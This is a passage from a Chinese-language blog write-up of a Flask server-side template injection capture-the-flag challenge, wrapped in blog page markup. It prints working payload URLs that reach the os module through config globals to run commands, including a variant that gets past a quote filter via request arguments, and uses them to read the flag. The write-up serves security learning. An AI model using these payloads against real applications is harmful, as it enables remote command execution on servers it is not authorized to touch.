+<img src="/2021/08/30/%E8%AE%B0%E4%B8%80%E9%81%93%E5%85%B8%E5%9E%8B%E7%9A%84flask-SSTI%E9%A2%98%E7%9B%AE/5.png" class="">
+
+
+<p>全局查询之后, 发现有python3的os模块(在题目中也调用了os模块执行系统命令)。<br>查询官方文档之后, 得知 <code>os</code> 模块执行系统命令有两种方式 <code>os.system()</code> 和 <code>os.popen()</code></p>
+<p>其中 <code>os.system()</code> 无法获得输出和返回值, 所以这里采取 <code>os.popen()</code> 方法。使用 <code>read()</code> 方法可以看到输出结果。即 <code>os.popen().read()</code></p>
+<p>这时候一个完整的命令执行payload如下:<br><code>http://114.116.44.23:58470/syc?name=&#123;&#123; config.__class__.__init__.__globals__['os'].popen('whoami').read() &#125;&#125;</code></p>
+<p>这时候想到, 单引号是被过滤了的, 需要绕过单引号的过滤。查询资料得知, request.args是Flask中的一个属性，为返回请求的参数。我把 <code>module</code> 作为调用模块的变量名, 将调用的os模块传入。而<code>shell</code> 作为执行的命令的变量名, 将要执行的命令传入。<br>这时候构造的payload如下:<br><code>http://114.116.44.23:58470/syc?name=&#123;&#123; config.__class__.__init__.__globals__[request.args.module].popen(request.args.shell).read() &#125;&#125;&amp;module=os&amp;shell=whoami</code></p>
+<p>尝试执行, 得到结果如下: </p>
+<img src="/2021/08/30/%E8%AE%B0%E4%B8%80%E9%81%93%E5%85%B8%E5%9E%8B%E7%9A%84flask-SSTI%E9%A2%98%E7%9B%AE/6.png" class="">
+
+<p>命令能够成功执行了, 接下来就是拿flag了</p>
+<p>列下目录:</p>
+<img src="/2021/08/30/%E8%AE%B0%E4%B8%80%E9%81%93%E5%85%B8%E5%9E%8B%E7%9A%84flask-SSTI%E9%A2%98%E7%9B%AE/7.png" class="">
+
+<p>很好, 看到flag了。</p>
+<img src="/2021/08/30/%E8%AE%B0%E4%B8%80%E9%81%93%E5%85%B8%E5%9E%8B%E7%9A%84flask-SSTI%E9%A2%98%E7%9B%AE/8.png" class="">
+
+<p>…居然是假flag, 再看一下题目描述, flag是在服务器根目录。再去根目录下读一下flag。</p>
+<img src="/2021/08/30/%E8%AE%B0%E4%B8%80%E9%81%93%E5%85%B8%E5%9E%8B%E7%9A%84flask-SSTI%E9%A2%98%E7%9B%AE/9.png" class="">
+
+<p>拿到真flag了<br><code>Syc&#123;this_2s_Twice_interv1ew_F14g&#125;</code></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="https://link.hhtjim.com/163/1815162101.mp3">
+            </audio>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
